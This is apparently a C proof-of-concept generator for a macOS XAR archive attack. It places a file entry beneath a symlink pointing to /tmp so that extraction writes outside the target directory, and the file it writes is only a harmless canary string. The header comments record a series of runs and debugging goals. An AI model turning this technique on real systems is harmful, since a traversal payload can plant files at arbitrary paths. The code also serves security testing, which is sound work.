/*
 * build_xar_r36.c  — same 3-level nested XAR as r35, payload labelled RUN36
 *
 * Structure:
 *   id=1  DIRECTORY "d"
 *     id=2  SYMLINK  "link_to_tmp" -> /tmp
 *       id=3  FILE   "xar_gated_canary_macos.txt"   (child of SYMLINK)
 *
 * Run 35 result: id=1 and id=2 extracted, id=3 silently absent.
 * Run 36 goal: diagnose WHY — manual shell write test + xar -xvf verbose.
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <arpa/inet.h>
#include <zlib.h>
#include <CommonCrypto/CommonDigest.h>

#define XAR_MAGIC      0x78617221
#define XAR_CKSUM_SHA1 1

static void compress_buf(const unsigned char *in, size_t inlen,
                         unsigned char **out, size_t *outlen) {
    *outlen = compressBound(inlen) + 64;
    *out = malloc(*outlen);
    z_stream s = {0};
    deflateInit2(&s, Z_DEFAULT_COMPRESSION, Z_DEFLATED, 15, 8, Z_DEFAULT_STRATEGY);
    s.next_in  = (Bytef*)in;  s.avail_in  = (uInt)inlen;
    s.next_out = *out;        s.avail_out = (uInt)*outlen;
    deflate(&s, Z_FINISH);
    deflateEnd(&s);
    *outlen = s.total_out;
}

int main(void) {
    const char *payload_str = "XAR_SYMLINK2_GATE_A_3LEVEL_RUN36\n";
    const unsigned char *payload = (const unsigned char *)payload_str;
    size_t payload_len = strlen(payload_str);

    unsigned char *cz = NULL; size_t czlen = 0;
    compress_buf(payload, payload_len, &cz, &czlen);

    char toc_xml[4096];
    int tlen = snprintf(toc_xml, sizeof(toc_xml),
        "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
        "<xar><toc>"
          "<checksum style=\"sha1\"><offset>0</offset><size>20</size></checksum>"
          "<file id=\"1\"><name>d</name><type>directory</type>"
            "<file id=\"2\"><name>link_to_tmp</name><type>symlink</type><link>/tmp</link>"
              "<file id=\"3\"><name>xar_gated_canary_macos.txt</name><type>file</type>"
                "<data>"
                  "<offset>20</offset><size>%zu</size><length>%zu</length>"
                  "<encoding style=\"application/x-gzip\"/>"
                "</data>"
              "</file>"
            "</file>"
          "</file>"
        "</toc></xar>",
        payload_len, czlen);

    if (tlen <= 0 || (size_t)tlen >= sizeof(toc_xml)) {
        fprintf(stderr, "TOC too large\n"); return 1;
    }
    size_t toc_xml_len = (size_t)tlen;

    unsigned char *tocz = NULL; size_t toczlen = 0;
    compress_buf((const unsigned char *)toc_xml, toc_xml_len, &tocz, &toczlen);

    unsigned char sha1_hash[CC_SHA1_DIGEST_LENGTH];
    CC_SHA1(tocz, (CC_LONG)toczlen, sha1_hash);

    uint8_t hdr[28];
    {
        uint32_t magic    = htonl(XAR_MAGIC);
        uint16_t hdrsize  = htons(28);
        uint16_t version  = htons(1);
        uint32_t cktype   = htonl(XAR_CKSUM_SHA1);
        uint64_t toc_clen = __builtin_bswap64((uint64_t)toczlen);
        uint64_t toc_ulen = __builtin_bswap64((uint64_t)toc_xml_len);
        memcpy(hdr+ 0, &magic,   4); memcpy(hdr+ 4, &hdrsize, 2);
        memcpy(hdr+ 6, &version, 2); memcpy(hdr+ 8, &toc_clen,8);
        memcpy(hdr+16, &toc_ulen,8); memcpy(hdr+24, &cktype,  4);
    }

    FILE *f = fopen("malicious_ga.xar", "wb");
    if (!f) { perror("fopen"); return 1; }
    fwrite(hdr, 1, 28, f); fwrite(tocz, 1, toczlen, f);
    fwrite(sha1_hash, 1, 20, f); fwrite(cz, 1, czlen, f);
    fclose(f);

    printf("[+] malicious_ga.xar written (%zu bytes total)\n", 28+toczlen+20+czlen);
    printf("[*] 3-LEVEL: DIR(d) > SYMLINK(link_to_tmp->/tmp) > FILE(canary)\n");
    free(cz); free(tocz);
    return 0;
}
